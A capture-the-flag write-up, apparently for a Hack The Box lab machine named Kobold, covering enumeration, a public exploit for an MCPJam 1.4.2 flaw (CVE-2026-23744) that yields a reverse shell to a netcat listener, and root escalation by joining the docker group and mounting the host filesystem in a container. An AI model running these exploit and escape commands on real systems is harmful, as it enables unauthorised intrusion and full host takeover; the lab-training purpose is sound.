# Kobold
## Enumeration
### Nmap
As always we start with a `nmap` scan
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Now we add `kobold.htb` to our `/etc/hosts` and look for more `VHOSTS`, because the nmap scan mentioned `DNS:*.kobold.htb`  
### FFUF
This command will search for more `VHOSTS`:  
```bash
ffuf -k -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w ~/wl/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -fs 154
```
The `-k` flag will ignore certificate validation, because this box uses `SSL`.  
After a second we get two hits: `bin` and `mcp`.  
Let's add them both to our `/etc/hosts`.
### Web
First thing we see when checking out the `bin.` subdomain is the version of the software running: `2.0.2`. We check google for exploits but find nothing.  
Next we go to the `mcp.` subdomain and look around. In the settings tab we see `Version: v1.4.2`. Searching google for `mcpjam 1.4.2 exploit github` leads us to [this](https://github.com/InzegoSec/CVE-2026-23744)  
## Exploitation
We download the `requirements.txt` and `CVE-2026-23744.py` files. Next `pip3 install -r requirements.txt` and we are ready to exploit.  
Lastly let's setup a listener `nc -lvnp 1337` and check our `ip` with `ifconfig tun0`.  
```bash
python3 CVE-2026-23744.py --url https://mcp.kobold.htb --lhost <YOUR-IP> --lport 1337

[*] Exploit created by Inzego... Enjoy! ^^

[↓] Executing exploit: Payload send!
[+] Check your nc
```
And indeed we got a hit
```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
ben@kobold:~$
```
## ROOT
We see that user `ben` is part of `operator` group. Turns out this means we can make ourselves be part of `docker` group.  
```bash
newgrp docker
```
Membership in the `docker` group is equivalent to `root` level access because:
- docker containers can be run with arbitrary configs
- the host filesystem can be mounted inside a container
- commands executed inside the container run with root privilages
This makes it possible to bypass all file permissions on the host
### PRIV-ESC
Let's see if there are any available `docker` images
```bash
docker images
```
There in fact is an available image `privatebin/nginx-fpm-alpine:2.0.2`.  
Next we can mount the host's root filesystem into a container and override the default entrypoint to execute a command.  
```bash
docker run --rm -u 0 -v /:/mnt --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 -c "cat /mnt/root/root.txt"
```
This returned the contents of `root.txt`
